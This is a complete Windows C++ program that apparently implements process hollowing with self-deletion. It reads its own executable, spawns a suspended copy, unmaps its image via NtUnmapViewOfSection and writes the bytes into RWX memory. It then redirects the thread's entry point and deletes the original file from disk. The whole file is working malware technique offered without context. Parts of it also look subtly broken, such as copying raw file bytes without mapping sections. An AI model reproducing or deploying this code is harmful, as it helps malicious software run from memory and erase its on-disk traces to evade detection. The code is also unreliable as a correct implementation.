#include <windows.h>
#include <iostream>
#include <vector>
#include <string>

typedef LONG (NTAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);

bool deleteCurrentExecutable(const std::wstring& path) {
    if (DeleteFileW(path.c_str())) {
        std::wcout << L"Successfully deleted original executable: " << path << std::endl;
        return true;
    }
    std::wcerr << L"Failed to delete original executable: " << path << std::endl;
    return false;
}

bool loadExecutableIntoMemory(std::vector<char>& buffer) {
    wchar_t exePath[MAX_PATH];
    if (!GetModuleFileNameW(nullptr, exePath, MAX_PATH)) {
        std::cerr << "Failed to get executable path.\n";
        return false;
    }
    HANDLE file = CreateFileW(exePath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (file == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open executable file.\n";
        return false;
    }
    DWORD fileSize = GetFileSize(file, nullptr);
    buffer.resize(fileSize);
    DWORD bytesRead;
    if (!ReadFile(file, buffer.data(), fileSize, &bytesRead, nullptr) || bytesRead != fileSize) {
        std::cerr << "Failed to read executable file.\n";
        CloseHandle(file);
        return false;
    }
    CloseHandle(file);
    return true;
}

bool spawnMemoryBackedProcess(const std::vector<char>& buffer) {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessW(nullptr, exePath, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        std::cerr << "Failed to create process.\n";
        return false;
    }

    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &context)) {
        std::cerr << "Failed to get thread context.\n";
        TerminateProcess(pi.hProcess, 1);
        return false;
    }

    // Load NtUnmapViewOfSection from ntdll.dll
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        std::cerr << "Failed to load ntdll.dll.\n";
        TerminateProcess(pi.hProcess, 1);
        return false;
    }
    NtUnmapViewOfSection_t NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    if (!NtUnmapViewOfSection) {
        std::cerr << "Failed to locate NtUnmapViewOfSection function.\n";
        TerminateProcess(pi.hProcess, 1);
        FreeLibrary(hNtdll);
        return false;
    }

    // Get the base address of the new process image
    LPVOID baseAddress;
    SIZE_T bytesRead;
    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)(context.Rdx + (8 * 2)), &baseAddress, sizeof(baseAddress), &bytesRead) || bytesRead != sizeof(baseAddress)) {
        std::cerr << "Failed to read base address.\n";
        TerminateProcess(pi.hProcess, 1);
        FreeLibrary(hNtdll);
        return false;
    }

    // Unmap the memory in the target process where the executable was loaded
    if (NtUnmapViewOfSection(pi.hProcess, baseAddress) != 0) {
        std::cerr << "Failed to unmap existing process memory.\n";
        TerminateProcess(pi.hProcess, 1);
        FreeLibrary(hNtdll);
        return false;
    }
    FreeLibrary(hNtdll);

    // Allocate memory in the target process
    LPVOID remoteMemory = VirtualAllocEx(pi.hProcess, baseAddress, buffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        std::cerr << "Failed to allocate memory in target process.\n";
        TerminateProcess(pi.hProcess, 1);
        return false;
    }

    // Write the loaded executable into the new process's memory
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(pi.hProcess, remoteMemory, buffer.data(), buffer.size(), &bytesWritten) || bytesWritten != buffer.size()) {
        std::cerr << "Failed to write to process memory.\n";
        TerminateProcess(pi.hProcess, 1);
        return false;
    }

    // Retrieve the entry point offset from the PE header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer.data();
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)buffer.data() + dosHeader->e_lfanew);
    DWORD entryPointRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;

    // Set the process entry point to the new executable's entry point
    context.Rip = (DWORD64)remoteMemory + entryPointRVA;
    if (!SetThreadContext(pi.hThread, &context)) {
        std::cerr << "Failed to set thread context.\n";
        TerminateProcess(pi.hProcess, 1);
        return false;
    }

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

int main() {
    std::vector<char> exeBuffer;
    if (!loadExecutableIntoMemory(exeBuffer)) {
        return 1;
    }

    if (!spawnMemoryBackedProcess(exeBuffer)) {
        return 1;
    }

    wchar_t exePath[MAX_PATH];
    if (GetModuleFileNameW(nullptr, exePath, MAX_PATH)) {
        deleteCurrentExecutable(exePath);
    }

    return 0;
}

// Define WinMain to call main
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    return main();
}
